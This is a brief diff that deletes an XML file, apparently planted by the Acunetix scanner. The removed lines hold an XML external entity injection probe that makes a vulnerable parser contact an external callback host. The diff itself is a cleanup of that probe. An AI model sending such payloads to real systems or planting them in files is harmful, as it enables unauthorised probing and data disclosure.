@@ -1,5 +1,0 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE acunetix [
-  <!ENTITY acunetixent SYSTEM "http://hitJE9YZXK8XQ.bxss.me/">
-]>
-<xxx>&acunetixent;</xxx>
